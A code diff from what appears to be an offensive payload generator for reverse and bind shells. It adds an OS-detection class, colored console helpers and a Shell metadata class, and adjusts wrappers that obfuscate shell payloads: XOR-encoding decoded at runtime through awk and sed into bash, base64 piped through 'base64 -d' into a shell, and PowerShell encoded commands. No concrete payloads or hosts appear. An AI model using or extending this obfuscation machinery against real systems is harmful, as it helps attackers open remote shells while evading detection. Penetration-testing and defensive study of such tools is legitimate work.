@@ -1,13 +1,37 @@
 from encoders import powershell_base64, xor, to_unicode, to_urlencode
 from binascii import hexlify
 import platform
+import os
+
+class OperationalSystem(object):
+    def __init__(self):
+        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"
+
+SysOS = OperationalSystem()
+
+# These functions are widely used across the source-code.
+def info(msg):
+    if SysOS.OS == "linux":
+        msg = "[\033[094m+\033[0m] {0}".format(msg)
+    else:
+        msg = "[+] {0}".format(msg)
+    return msg
+
+def error(msg):
+    if SysOS.OS == "linux":
+        msg = "[\033[091m!\033[0m] {0}".format(msg)
+    else:
+        msg = "[!] {0}".format(msg)
+    return msg
+#=================
 
 def xor_wrapper(name, code, args, shell="/bin/bash"):
     if args.shell is not "":
         shell = args.shell
     if "powershell" not in name.lower():
-        code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
-        code = shell + " -c '" + code + "'"
+        if "windows" not in name.lower():
+            code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
+            code = shell + " -c '" + code + "'"
     else:
         prefix, xcode = code.split("-Command")
         pcode = xcode.replace("'", "")
@@ -24,8 +48,9 @@ def base64_wrapper(name, code, args,shell="/bin/bash"):
     if args.shell is not "":
         shell = args.shell
     if args.base64 is True:
-        if "powershell" not in name.lower():
-            code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
+        if "powershell" not in name.lower(): # post-note: linux powershell is going to have problem.
+            if "windows" not in name.lower():
+                code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
         else:
             # Powershell encoding code
             prefix, xcode = code.split("-Command")
@@ -34,6 +59,34 @@ def base64_wrapper(name, code, args,shell="/bin/bash"):
             code = prefix + "-Encoded " + powershell_base64(pcode)
     return code
 
+
+class Shell(object):
+    def __init__(self, name, shell_type, proto, code, os=None, arch=None, use_handler=None, use_http_stager=None):
+        """
+        ShellCode object is responsible for holding information about
+        the static characteristics and informations about this shell 
+        entry.
+        It does not is reponsible for generating code or applying en-
+        encoders. This is done by ReverseShell() or BindShell() clas-
+        ses.
+        """
+
+        # These are the required attributes;
+        self.name = name
+        self.type = shell_type
+        self.proto = proto
+        self.code = code
+
+        # These are optional attributes;
+        self.os = "Unknown" if os is None else os
+        self.arch = "Unknown" if arch is None else arch
+        self.handler = None if use_handler is None else use_handler # this is going to be the handler function.
+        self.handler_args = None # this is going to be set during execution.
+
+        self.use_http_stager = False if use_http_stager is None else use_http_stager
+        return
+    
+    
 class ReverseShell(object):
     def __init__(self, name, args, code):
         self.name = name
@@ -41,6 +94,7 @@ class ReverseShell(object):
         self.host = args.host
         self.port = args.port
         self.code = code
+        self.payload = str() # this is where the final code is stored.
 
     def get(self):
         """
@@ -56,7 +110,7 @@ class ReverseShell(object):
         self.code = base64_wrapper(self.name, self.code, self.args)
 
         # Apply URL-encoding
-        if self.args.urlencode is True:
+        if self.args.urlencode is True and self.args.handler is None:
             self.code = to_urlencode(self.code)
         
         return self.code
@@ -67,6 +121,7 @@ class BindShell(object):
         self.args = args
         self.port = args.port
         self.code = code
+        self.payload = str() # this is where the final code is stored.
 
     def get(self):
         """
@@ -86,7 +141,3 @@ class BindShell(object):
             self.code = to_urlencode(self.code)
         
         return self.code
-
-class OperationalSystem(object):
-    def __init__(self):
-        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"
